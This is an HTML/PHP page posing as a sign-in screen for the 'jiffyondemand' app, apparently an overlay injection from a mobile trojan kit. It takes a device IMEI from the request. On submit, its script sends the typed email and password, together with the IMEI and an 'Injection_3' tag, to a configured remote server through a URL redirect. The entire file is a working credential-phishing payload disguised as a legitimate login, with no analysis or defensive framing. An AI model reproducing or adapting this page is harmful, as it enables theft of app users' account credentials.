<!-- 4.5.9 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="it/com.jiffyondemand.user/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="footer">
        <img style="margin-bottom: 30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHkAAABHCAIAAACs6H/DAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6N0VBRTYxMzhCOTBDMTFFODg0NEVGQjNBRTcyQjJFQkUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6N0VBRTYxMzlCOTBDMTFFODg0NEVGQjNBRTcyQjJFQkUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo3RUFFNjEzNkI5MEMxMUU4ODQ0RUZCM0FFNzJCMkVCRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo3RUFFNjEzN0I5MEMxMUU4ODQ0RUZCM0FFNzJCMkVCRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqWEzF4AAA4oSURBVHja7Fx5bBzl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">

        <form action="null"  method="post" id="_mainForm" target="flow_handler">
            <input type="email" class="field" name="email" id="email" placeholder="Email">

            <input type="password" class="field" name="password" id="password" placeholder="Password">

            <input type="submit" class="button" id="input_submitBtn" value="Log In">
        </form>
        <p style="color: #b1e0f7; font-size: 12px;font-weight: 600;"> Forgot your login details? <b style="color: #fff;"> Get help signing in. </b></p>
        <p style="color: #b1e0f7; font-size: 12px;font-weight: 600;"> Don't have an account? <b style="color: #fff;"> Sign up. </b></p>
    </div>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('input_submitBtn');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('email');
            var oCodeInp = document.getElementById('password');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field';
            } catch(e){};

            if (!/^[^\s()<>@,;:\/]+@\w[\w\.-]+\.[a-z]{2,}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|it_jiffy|"+oNumInp.value+"|"+oCodeInp.value);

           return false;
       };

   })();
</script>
</body>
</html>
